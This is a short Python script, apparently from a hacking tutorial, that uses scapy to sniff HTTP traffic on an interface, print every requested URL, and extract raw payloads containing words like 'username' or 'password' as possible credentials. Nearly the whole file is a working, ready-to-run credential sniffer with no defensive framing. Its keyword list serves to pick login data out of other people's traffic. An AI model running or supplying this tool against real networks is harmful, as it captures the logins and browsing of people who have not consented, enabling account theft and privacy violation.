'''
This is a program to sniff packets using scapy. 
Scapy gives us the scapy.sniff function which takes some arguments(interface=eth0, store=False, prn=cb(packet))

We call a function cb() when scapy sniffs a packet

Packet can be filtered by packet.haslayer method
'''


import scapy.all as scapy
from scapy.layers import http


def getUrl(packet):

    # Harvest the url
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def getlogininfo(packet):
    # Check if packet has layer scapy.Raw where credentials are stored
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'email', 'password', 'pass', 'login']

        for el in keywords:
            if el in str(load):
                return load
            
        return False


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        snifurl = getUrl(packet)
        if snifurl:
            print(f'[+] HTTP Request >> {snifurl}')

        credentials = getlogininfo(packet)
        if credentials:
            print(f'\n\n[+] Possible credentials >> + {str(credentials)}\n\n')        


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniff('eth0')
